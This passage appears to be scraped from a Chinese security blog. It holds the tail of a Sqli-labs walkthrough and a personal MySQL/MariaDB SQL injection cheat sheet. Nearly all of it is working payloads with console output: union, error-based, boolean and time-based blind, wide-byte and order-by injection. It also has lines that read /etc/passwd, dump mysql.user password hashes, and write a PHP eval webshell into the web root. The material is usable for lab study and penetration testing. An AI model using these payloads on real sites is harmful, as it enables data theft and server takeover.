#探测为'0'||left(database(),1)='s'%26%26'1'='1白盒审计知道是')0%27)%a0union%a0select%a01,database(),2||('10%27)%a0union%a0select%a01,database(),2;%00 Less-27题目提示union与select被过滤了，可用大小写绕过 12340'||'1'='10'||left(database(),1)='s'%26%26'1'='10'%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 Less-27a增加了\" 10\"%0AunIon%0AselEct%0A1,group_concat(schema_name),2%0Afrom%0Ainformation_schema.schemata;%00 Less-28union select大小写均被过滤，但是select还可单独用，盲注即可 10')||left(database(),1)&gt;'s';%00 Less-28a依然可以用盲注 120')||left((database()),1)='s';%000')||left((selEct%0agroup_concat(schema_name)%0afrom%0Ainformation_schema.schemata),1)&lt;'s';%00 Less-29利用tomcat与apache解析相同请求参数不同的特性，tomcat解析相同请求参数取第一个，而apache取第二个，如?id=1&amp;id=2，tomcat取得1，apache取得2 1?id=1&amp;id=0' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-30与 29 架构一样，原理一致只不过加了\"限制 1?id=1&amp;id=0\" union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-31架构一样，多了\") 1?id=1&amp;id=0\") union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-32注意是GBK，可以用%df进行宽字节注入 120%df%27%20or%201=1%230%df' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-3310%df' union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-341uname=0%df'%20union+selEct%201,group_concat(schema_name)%20from%20information_schema.schemata%3b%23&amp;passwd=1&amp;submit=Submit Less-3510 union selEct 1,group_concat(schema_name),2 from information_schema.schemata;%23 Less-36120%df%27%20union%20selEct%201,group_concat(schema_name),2%20from%20information_schema.schemata;%23-1%EF%BF%BD%27union%20select%201,user(),3--+ Less-371uname=0%df%27%20union%20selEct%20group_concat(schema_name),2%20from%20information_schema.schemata;%23&amp;passwd=1&amp;submit=Submit Less-38堆叠注入，成功创建test数据表 11';create table test like users;%23 Less-3911;create table test39 like users;%23 Less-4011');create table test40 like users;%23 Less-4111;create table test41 like users;%23 Less-42password处无过滤 1login_user=1&amp;login_password=1'%3bcreate+table+test43+like+users%3b%23&amp;mysubmit=Login Less-43password处无过滤 1login_user=1&amp;login_password=1')%3bcreate+table+test43+like+users%3b%23&amp;mysubmit=Login Less-441login_user=1&amp;login_password=1'%3bcreate+table+test44+like+users%3b%23&amp;mysubmit=Login Less-451login_user=1&amp;login_password=1')%3bcreate+table+test45+like+users%3b%23&amp;mysubmit=Login Less-46order by注入 username、password均为列名，所以以下需要知道列名 123456?order=if(1=1,username,password)?order=null,if(1=1,username,password)?order=(case when (1=1) then username else password end)?order=ifnull(null, username)?order=rand(1=1) //order by rand(1)/rand(0)两者返回不一样?order=(select 1 regexp if(1=1,1,0x00)) 将1=1换成bool盲注的语句函数即可用于获取数据sort=rand(ascii(database(),1))=115) 时间盲注 12sort=1 and if(ascii(substr(database(),1,1))=116,0,sleep(5))sort=(select if(substring(current,1,1)=char(115),benchmatrk(5000000,md5('1')),null) from (select database() as current) as tb1) Bool 盲注 1rand(ascii(left(database()),1))=115) 报错注入： 12updatexml(1,if(1=1,concat(0x7e,version()),2),1)(select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))) procedure analyse 参数后注入 1sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) into outfile参数: 1id=1 into outfield \"path\" 上传网马，可以在后面加上lines terminated by 16进制转码的数据 Less-47有'，可以用报错 121'and (select count(*) from information_schema.columns group by concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2)))--+1'and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x)--+ 也可以用时间盲注 11'and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+ procedure analyse 参数后注入 11'procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)--+ Less-48121 and If(ascii(substr(database(),1,1))&gt;115,0,sleep (5))--+sort=rand(ascii(left(database(),1))=115) Less-49121' and If(ascii(substr(database(),1,1))=115,0,sleep (5))--+1' and (If(ascii(substr((select username from users where id=1),1,1))=68,0,sleep(5)))--+ Less-50堆叠注入 11;create table test50 like users;%23 Less-5111';create table test51 like users;%23 Less-5211;create table test52 like users;%23 Less-5311';create table test53 like users;%23","link":"/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/"},{"title":"Sql注入备忘录","text":"自用 Sqli 备忘录，随时更新 [TOC] Mysql(基于 10.3.11-MariaDB)Basic查看当前数据库版本 VERSION() @@VERSION @@GLOBAL.VERSION 当前登录用户 USER() CURRENT_USER() SYSTEM_USER() SESSION_USER() 当前使用的数据库 DATABASE() SCHEMA() 当前的操作系统 @@version_compile_os 路径相关 @@BASEDIR : mysql安装路径： @@SLAVE_LOAD_TMPDIR : 临时文件夹路径： @@DATADIR : 数据存储路径： @@CHARACTER_SETS_DIR : 字符集设置文件路径 @@LOG_ERROR : 错误日志文件路径： @@PID_FILE : pid-file文件路径 @@BASEDIR : mysql安装路径： @@SLAVE_LOAD_TMPDIR : 临时文件夹路径 字母/数字相关 ASCII(): 获取字母的ascii码值 BIN(): 返回值的二进制串表示 CONV(): 进制转换 FLOOR(): 函数只返回整数部分，小数部分舍弃。 ROUND(): 函数四舍五入，大于0.5的部分进位，不到则舍弃。 LOWER()：转成小写字母 UPPER(): 转成大写字母 HEX():十六进制编码 UNHEX()：十六进制解码 字符串截取 MID(column_name,start[,length]) start起始为1 LEFT(str,length) length为从左边开始要返回的字符数 RIGHT(str,length). length为从右边开始要返回的字符数 SUBSTR(str,pos,len) 从pos开始截取len个,pos起始为1,pos 可以是负值 SUBSTRING(str,pos,len). 与subsets()相同 ‘注释’ — -(–后面有个空格) select * from message ;-- -where id =1; select * from message ;--where id =1; —+ select * from message ;—+where id =1; # select * from message ;#where id =1; %00 select * from message ;%00where id =1; /**/ select * from message ;/*where id =1;*/ 常用语句查找所有用户 1select group_concat(user) from mysql.user; 用户hash： 1select group_concat(password) from mysql.user where user='root' 数据库 1234SELECT group_concat(schema_name) from information_schema.schemata;select distinct(database_name) from mysql.innodb_table_stats;select distinct(Db) from mysql.db; 表名： 1234567SELECT group_concat(table_name) from information_schema.tables where table_schema='table_name';//表中有主码约束，非空约束等完整性约束条件的才能用这个语句查询出来SELECT group_concat(table_name) from information_schema.table_constraints where table_schema='table_name_xxx';//mysql&gt;5.6select distinct(table_name) from mysql.innodb_index_stats; 列名: 1SELECT group_concat(column_name) from information_schema.columns where table_name='column_name_xxx'; 读文件： 1SELECT load_file('/etc/passwd'); 写文件： 1SELECT '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/html/shell.php'; 注入技术Union 注入判断是否可以注入假设有: www.test.com/?id=1 数值型注入12345?id=1+1?id=-1 or 1=1?id=-1 or 10-2=8?id=1 and 1=2?id=1 and 1=1 字符型注入12345678?id=1'?id=1\"?id=1' and '1'='1?id=1\" and \"1\"=\"1?id=1')?id=1\")?id=1') and '1'='1?id=1\") and \"1\"=\"1 查询列数用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。 12345678UNION SELECT 1,2,3 #UNION ALL SELECT 1,2,3 #UNION ALL SELECT null,null,null #ORDER BY 10 #ORDER BY 5 #ORDER BY 2 #.... 基本用法1UNION SELECT 1,password,3 from admin 过滤了逗号的 union 注入1234567mysql&gt; select 1,2,3 union select * from (select version())a join (select database())b join (select database())c;+-----------------+------+------+| 1 | 2 | 3 |+-----------------+------+------+| 1 | 2 | 3 || 10.3.11-MariaDB | test | test |+-----------------+------+------+ 报错注入利用数据库报错来显示数据的注入方式经常会在入侵中利用到，这种方法有一点局限性，需要页面有错误回显。 分类MYSQL报错注入大体可以分为以下几类： BIGINT等数据类型溢出 xpath语法错误 concat+rand()+group_by()导致主键重复 空间数据类型函数错误 floor注入语句1?id=1 OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) floor：函数只返回整数部分，小数部分舍弃。 round：函数四舍五入，大于0.5的部分进位，不到则舍弃。 注入原理目前比较常见的几种报错注入的方法都是利用了mysql某些不能称为bug的bug来实现的。 下面就以 rand() 函数来进行说明。mysql的官方文档中对 rand() 函数有特殊的说明： 1RAND() in a WHERE clause is re-evaluated every time the WHERE is executed. You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times. However, you can retrieve rows in random order like this: 官方文档中的意思是：在where语句中，where每执行一次，rand()函数就会被计算一次。rand()不能作为order by的条件字段，同理也不能作为group by的条件字段。 因此在 mysql 中，可以构造一个值不确定而有可重复的字段作为group by的条件字段，这是就可以报出类似于Duplicate entry ‘…’ for key ‘group_key’的错误 UpdateXml(有长度限制,最长32位)MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数，分别是ExtractValue()和UpdateXML() 因此在mysql 小于5.1.5中不能用ExtractValue和UpdateXML进行报错注入。 注入语句1?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) 注入原理1UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_string ( Xpath 格式的字符串) 第三个参数：new_value，String 格式，替换查找到的符合条件的数据 作用：改变文档中符合条件的节点的值 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为NULL。 通过查询@@version,返回版本。然后CONCAT将其字符串化。因为UPDATEXML第二个参数需要Xpath格式的字符串,所以不符合要求，然后报错。 ExtractValue(有长度限制,最长32位)注入语句1?id=1 and extractvalue(1, concat(0x7e, (select @@version),0x7e)) 注入原理1EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是 String 格式，为 XML 文档对象的名称，文中为 Doc 第二个参数：XPath_string ( Xpath 格式的字符串) 作用：从目标 XML 中返回包含所查询值的字符串 第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里 NAME_CONST(适用于低版本，不太好用)1?id=261 and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) Error based Double Query Injection1?id=1 or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1 exp(5.5.5以上)在 mysql 5.5 之前，整形溢出是不会报错的，根据官方文档说明out-of-range-and-overflow，只有版本号大于5.5.5 时，才会报错。利用exp函数也产生类似的溢出错误 1?id=1 and (select exp(~(select * from(select user())x))) 测试未通过，存在可用性的emetryCollection() multipoint() polygon() multipolygon() linestring() multilinestring() 以上函数均为MySQL中的空间数据类型（存储）的函数，目前仅在MyISAM数据引擎下提供空间索引支持,要求几何字段非空 1234567891011121314151617multipoint()?id=1 or multipoint((select * from(select * from(select user())a)b))%23multipolygon()?id=1 or multipolygon((select * from(select * from(select database())a)b))%23multilinestring()?id=1 or multilinestring((select * from(select * from(select user())a)b))%23linestring()?id=1 or LINESTRING((select * from(select * from(select user())a)b))%23GeometryCollection()?id=1 or GeometryCollection((select * from(select * from(select user())a)b))%23polygon()?id=1 or polygon((select * from(select * from(select user())a)b))%23 Bool 盲注在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。 正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入 正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。 提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。 几种简单的判断语句，在真实利用中需要根据情况而变化: CASE IF() IFNULL() NULLIF() 盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。 构造 bool 条件123456789101112131415161718192021//正常情况'or bool#true'and bool# //不使用空格、注释'or(bool)='1true'and(bool)='1 //不使用or、and、注释'^!(bool)='1'=(bool)=''||(bool)='1true'%26%26(bool)='1'=if((bool),1,0)='0 //不使用等号、空格、注释'or(bool)&lt;&gt;'0'or((bool)in(1))or'0 //其他or (case when (bool) then 1 else 0 end) 有时候where字句有括号又猜不到 SQL 语句的时候，可以有下列类似的 fuzz 121' or (bool) or '1'='11%' and (bool) or 1=1 and '1'='1 有时候也可以通过与表中的数据进行对比 12345678910111213141516mysql&gt; select * from admin where username=\"\" || id=2 &amp;&amp; password&lt;\"5\";+----+----------+----------+------+| id | username | password | num |+----+----------+----------+------+| 2 | admin | 456 | 20 |+----+----------+----------+------+1 row in set (0.00 sec)mysql&gt; select * from admin where username=\"\" || id=3 &amp;&amp; password&lt;\"8\";+----+----------+----------+------+| id | username | password | num |+----+----------+----------+------+| 3 | test | 789 | 30 |+----+----------+----------+------+1 row in set (0.00 sec)mysql&gt; select * from admin where username=\"\" || id=3 &amp;&amp; password&lt;\"7\";Empty set (0.00 sec) 这样通过id指定的话改一下payload直接上脚本把数据全脱了。另外如果想跨表查询的话 123456mysql&gt; select a.password&lt;'z' from users a limit 1,1;+----------------+| a.password&lt;'z' |+----------------+| 1 |+----------------+ 构造逻辑判断1234567891011left(user(),1)&gt;'r' right(user(),1)&gt;'r' substr(user(),1,1)='r' mid(user(),1,1)='r' //不使用逗号 user() regexp '^[a-z]'user() like 'root%'POSITION('root' in user())mid(user() from 1 for 1)='r'mid(user() from 1)='r' ASCII()、ORD()和CHAR()函数一般用做辅助。 利用 order by 盲注1234567891011121314151617mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | 2 | 5 || 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 |+----+----------+----------------------------------+2 rows in set (0.00 sec) mysql&gt; select * from admin where username='' or 1 union select 1,2,'6' order by 3;+----+----------+----------------------------------+| id | username | password |+----+----------+----------------------------------+| 1 | admin | 51b7a76d51e70b419f60d3473fb6f900 || 1 | 2 | 6 |+----+----------+----------------------------------+2 rows in set (0.01 sec) 这种注入一般出现在登录处，形成bool条件。这里只获取password的值，也可以跟多个UNION查询其他的数据，此方法优点在于不使用括号等号等字符。利用order by姿势很多，自由发挥了。 延时注入一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况： SLEEP(n) 让mysql停n秒钟 BENCHMARK(count,expr) 重复countTimes次执行表达式expr，如BENCHMARK(100000,MD5(1)) BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用sleep()。 一些注意事项： 使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。 时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。 当在页面上看不到任何明显变化时，再考虑选择使用延时注入 相对于bool盲注，就是把返回值0和1改为是否执行延时，能用其他方法就不使用延时。 一般格式if((bool),sleep(3),0)和or (case when (bool) then sleep(3) else 0 end) 如果这两个函数ban掉的话可以利用笛卡尔积造成延迟来进行注入。 1' and if(ascii(substr((select database()),%d,1))&lt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.tables C),1)# 另外还可以利用不正确的正则表达式来 1select if(substr((select 1)='1',1,1),concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',1); 检测方法1234561 OR SLEEP(25)=0 LIMIT 1 #1) OR SLEEP(25)=0 LIMIT 1 #1' OR SLEEP(25)=0 LIMIT 1 #') OR SLEEP(25)=0 LIMIT 1 #1)) OR SLEEP(25)=0 LIMIT 1 #SELECT SLEEP(25) # payload123UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0);UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0); insert/update/delete 注入insert报错注入方式： 123insert into message(id,user_id,message_id) values (4,'zedd' or updatexml(1,concat(0x7e,(select @@version),0x7e),0) or '', 'hi');insert into message(id,user_id,message_id) values (4,'zedd' or extractvalue(1,concat(0x7e,(select @@version))) or '', 'hi'); 没有回显可以使用延时 1insert into message(id,user_id,message_id) values (5,'0' or IF(SUBSTR((SELECT GROUP_CONCAT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA),1,1)&lt;200,SLEEP(10),0), 'hi'); update报错注入方式： 123update message set user_id='1' or updatexml(1,concat(0x7e,(version()),0x7e),0) or''WHERE id=2;update message set user_id='1' or extractvalue(1,concat(0x7e,database())) or''WHERE id=2; delete报错注入方式： 123DELETE FROM message WHERE id=2 or updatexml(1,concat(0x7e,(version()),0x7e),0) or'';DELETE FROM message WHERE id=2 or extractvalue(1,concat(0x7e,database())) or''; Order by 后注入报错注入11 and extractvalue(1, concat(0x7e, (select @@version),0x7e)); bool盲注 利用 rand()1order by IF((bool),1,(select 1 union select 2)); 使用rand 1234567891011121314151617181920MariaDB [test]&gt; select id from message order by rand(true);+----+| id |+----+| 5 || 3 || 1 || 2 |+----+4 rows in set (0.002 sec)MariaDB [test]&gt; select id from message order by rand(false);+----+| id |+----+| 1 || 5 || 2 || 3 |+----+4 rows in set (0.001 sec) rand(true)与rand(flase)返回不同来判断 1234567891011121314151617181920212223242526272829303132MariaDB [test]&gt; select id from message order by rand(SUBSTR((SELECT database()),1,1)&gt;'t');+----+| id |+----+| 1 || 5 || 2 || 3 |+----+4 rows in set (0.001 sec)MariaDB [test]&gt; select id from message order by rand(SUBSTR((SELECT database()),1,1)&lt;'t');+----+| id |+----+| 1 || 5 || 2 || 3 |+----+4 rows in set (0.000 sec)MariaDB [test]&gt; select id from message order by rand(SUBSTR((SELECT database()),1,1)='t');+----+| id |+----+| 5 || 3 || 1 || 2 |+----+4 rows in set (0.000 sec) 延时注入 order by if()不推荐，因为每条数据都会执行延时，能用其他方法就不使用延时。 12345678910MariaDB [test]&gt; select id from message order by IF(1,sleep(3),0);+----+| id |+----+| 1 || 2 || 3 || 5 |+----+4 rows in set (12.214 sec) 延时了 12s 左右。 Limit 注入先看看 Mysql 5 中的 select 语法 1234567891011121314151617181920SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [WHERE where_condition] [GROUP BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY {col_name | expr | position} [ASC | DESC], ...] [LIMIT {[offset,] row_count | row_count OFFSET offset}] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] 可以看到LIMIT后可以接PROCEDURE与INTO，而INTO用于写 webshell 使用，这里接不赘述，我们重点来看PROCUDURE，而且这里与版本有关，新版本的在PROCUDURE中已不支持使用SELECT 老版本(为测试具体版本号，估计在 5.7 以前)可以若没有order by后可面接union，有order by可用benchmark或者报错注入，详情参考【SQL注入】mysql limit 注入 报错注入12345678910MariaDB [test]&gt; select * from user where id&gt;0 order by id LIMIT 0,1;+----+----------+--------+| id | username | passwd |+----+----------+--------+| 1 | admin | admin |+----+----------+--------+1 row in set (0.001 sec)MariaDB [test]&gt; select * from user where id&gt;0 order by id LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);ERROR 1105 (HY000): XPATH syntax error: ':10.3.11-MariaDB' Group By 注入报错注入12345MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1);ERROR 1105 (HY000): XPATH syntax error: '~10.3.11-MariaDB~'MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id and (select 1 from(select count(*),concat((select (select (SELECT @@version)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a);ERROR 1062 (23000): Duplicate entry '10.3.11-MariaDB1' for key 'group_key' 延时注入1234567MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id and if(mid(user(),1,1)='r',sleep(3),0);+----+----------+--------+| id | username | passwd |+----+----------+--------+| 1 | admin | admin |+----+----------+--------+1 row in set (9.150 sec) Union 注入1234567891011121314151617181920212223242526MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id union select 1,2,3;+----+----------+--------+| id | username | passwd |+----+----------+--------+| 1 | admin | admin || 2 | hasaki | hasaki || 3 | 666 | 2333 || 1 | 2 | 3 |+----+----------+--------+4 rows in set (0.000 sec)MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id union select 1,2,3 limit 3,1;+----+----------+--------+| id | username | passwd |+----+----------+--------+| 1 | 2 | 3 |+----+----------+--------+1 row in set (0.000 sec)MariaDB [test]&gt; select * from user where id&gt;0 GROUP BY id union select 1,user(),3 limit 3,1;+----+----------------+--------+| id | username | passwd |+----+----------------+--------+| 1 | root@localhost | 3 |+----+----------------+--------+1 row in set (0.002 sec) 读写文件利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。 查询用户读写权限： 1SELECT file_priv FROM mysql.user WHERE user = 'root'; 首先查看变量确定权限 1show variables like '%secure%'; 当 secure_file_priv 为空，就可以读取磁盘的目录。 当 secure_file_priv 为G:\\，就可以读取G盘的文件。 当 secure_file_priv 为 null，load_file 就不能加载文件。 load_file()读取条件 需要有读取文件的权限 需要知道文件的绝对物理路径。 要读取的文件大小必须小于 max_allowed_packet 1SELECT @@max_allowed_packet; 直接使用绝对路径 123SELECT LOAD_FILE(\"/etc/passwd\");SELECT LOAD_FILE(CHAR(47,101,116,99,47,112,97,115,115,119,100));SELECT LOAD_FILE(0x2f6574632f706173737764); SELECT 导出条件 一般要指定绝对路径 需导出的目录有可写权限 要outfile出的文件不能已经存在 1SELECT DATABASE() INTO OUTFILE '/tmp/test'; 写入 WebShell条件 需要知道网站的绝对物理路径，这样导出后的webshell可访问 对需导出的目录有可写权限。 1SELECT \"&lt;?php eval($_POST['a'])?&gt;\" INTO OUTFILE '/var/www/html/shell.php'; 宽字节注入原理1234mysql_query(\"SET NAMES 'gbk'\");$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;$sql = \"SELECT * FROM test WHERE names='{$name}'\"; addslashes()会在单引号或双引号前加上一个\\。当 mysql 使用 GBK 字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入name=root%df%27，%在服务器端会出现如下转换：root%df%27 -&gt; root%df%5c%27 -&gt; root運'。 更多内容可见：浅析白盒审计中的字符编码及SQL注入 利用1234index.php?name=1%df'index.php?name=1%a1'index.php?name=1%aa'... 在被addslashes后，出现%XX%5c，当前一个字符的 ascii 码值大于 128 时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉\\。 表名可控注入详细可参考当表名可控的注入遇到了Describe时的几种情况 表名不完全可控且DESC的表名含有反引号,SELECT的表名不含反引号test.php 代码如下 12345678910&lt;?phpmysql_connect(\"127.0.0.1\",\"root\",\"123456\");mysql_query(\"use test\");$table = $_GET['table'];mysql_query(\"desc `shop_$table`\") or die(\"DESC 出错:\".mysql_error());$sql = \"select * from shop_$table where 1=1\";echo $sql;echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\";var_dump(mysql_fetch_array(mysql_query(\"$sql\")));echo mysql_error(); payload : 1user` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23` shop_users 后面的两个``,做了shop_users 表的别名，所以无影响，不会进入 die。sql 语句才得以执行 1select * from message `` where updatexml(1,concat(0x7e,(select user()),0x7e),1)#; where 1=1; 表名不完全可控且DESC的表名不含反引号,SELECT的表名含有反引号test.php 源码如下： 12345678910&lt;?phpmysql_connect(\"127.0.0.1\",\"root\",\"123456\");mysql_query(\"use test\");$table = $_GET['table'];mysql_query(\"desc shop_{$table}\") or die(\"DESC 出错:\".mysql_error());$sql = \"select * from `shop_{$table}` where 1=1\";echo $sql;echo \"&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;\";var_dump(mysql_fetch_array(mysql_query(\"$sql\")));echo mysql_error(); payload : 1user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)%23` sql 语句： 1select * from `shop_user` where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`` where 1=1 无列名注入别名12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455MariaDB [test]&gt; select * from (select 1)a,(select 2)b,(select 3)c;+---+---+---+| 1 | 2 | 3 |+---+---+---+| 1 | 2 | 3 |+---+---+---+1 row in set (0.000 sec)MariaDB [test]&gt; select * from (select 1)a,(select 2)b,(select 3)c union select * from user;+---+--------+--------+| 1 | 2 | 3 |+---+--------+--------+| 1 | 2 | 3 || 1 | admin | admin || 2 | hasaki | hasaki || 3 | 666 | 2333 |+---+--------+--------+4 rows in set (0.001 sec)MariaDB [test]&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e;+--------+| 3 |+--------+| 3 || admin || hasaki || 2333 |+--------+4 rows in set (0.001 sec)MariaDB [test]&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e limit 1 offset 3 ;+------+| 3 |+------+| 2333 |+------+1 row in set (0.001 sec)MariaDB [test]&gt; select * from user where id=1 union select 1,2,3;+----+----------+--------+| id | username | passwd |+----+----------+--------+| 1 | admin | admin || 1 | 2 | 3 |+----+----------+--------+2 rows in set (0.000 sec)MariaDB [test]&gt; select * from user where id=1 union select (select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from user)e limit 1 offset 3),2,3;+------+----------+--------+| id | username | passwd |+------+----------+--------+| 1 | admin | admin || 2333 | 2 | 3 |+------+----------+--------+2 rows in set (0.001 sec) 变量使用变量需要执行两次sql 12345678910MariaDB [test]&gt; select * from user limit 0,1 into @a,@b,@c;Query OK, 1 row affected (0.001 sec)MariaDB [test]&gt; select * from user where username='' union select @a,@b,@c;+------+----------+--------+| id | username | passwd |+------+----------+--------+| 1 | admin | admin |+------+----------+--------+1 row in set (0.002 sec) 可报错时爆表名、字段名、库名字段名上文介绍可以使用无列名注入，但是如果再进行限制，不允许使用union该怎么破呢？ 12MariaDB [test]&gt; select * from user where id=1 and (select * from (select * from user as a join user as b) as c);ERROR 1060 (42S21): Duplicate column name 'id' 把当前表第一个字段成功爆出来了。这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名 c 的时候查询到重复字段，就成功报错。 同时，可以利用using爆其他字段： 12345MariaDB [test]&gt; select * from user where id=1 and (select * from (select * from user as a join user as b using(id)) as c);ERROR 1060 (42S21): Duplicate column name 'username'MariaDB [test]&gt; select * from user where id=1 and (select * from (select * from user as a join user as b using(id,username)) as c);ERROR 1060 (42S21): Duplicate column name 'passwd' 表名Mysql 文档中有一个函数： Polygon(ls1, ls2, …) Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是 NULL 如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。 123select * from user where id=1 and Polygon(1);select * from user where id=1 and polygon (()select * from(select user ())a)b ); 库名上面的方法已经可以爆出库名了，提供另一个方法 12MariaDB [test]&gt; select * from user where id =1-a();ERROR 1305 (42000): FUNCTION test.a does not exist 约束攻击首先 mysql 5.5 版本以上需要设置数据库为宽松模式，避免出现插入错误 error 1set @@sql_mode=ANSI; 首先查看原来的sql_mode，修改一次sql_mode 123456789101112131415161718mysql&gt; select @@sql_mode;+-------------------------------------------------------------------------------------------------------------------------------------------+| @@sql_mode |+-------------------------------------------------------------------------------------------------------------------------------------------+| ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION |+-------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; set @@sql_mode=ANSI;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; select @@sql_mode;+--------------------------------------------------------------------------------+| @@sql_mode |+--------------------------------------------------------------------------------+| REAL_AS_FLOAT,PIPES_AS_CONCAT,ANSI_QUOTES,IGNORE_SPACE,ONLY_FULL_GROUP_BY,ANSI |+--------------------------------------------------------------------------------+1 row in set (0.00 sec) 在宽松模式下创建数据库，并且先插入admin的数据 12345678910111213141516mysql&gt; CREATE TABLE users ( -&gt; username varchar(25), -&gt; password varchar(25) -&gt; );Query OK, 0 rows affected (0.02 sec)mysql&gt; INSERT INTO users(username,password) VALUES ('admin', 'rand_pass');Query OK, 1 row affected (0.001 sec)mysql&gt; select * from users where username='admin';+----------+-----------+| username | password |+----------+-----------+| admin | rand_pass 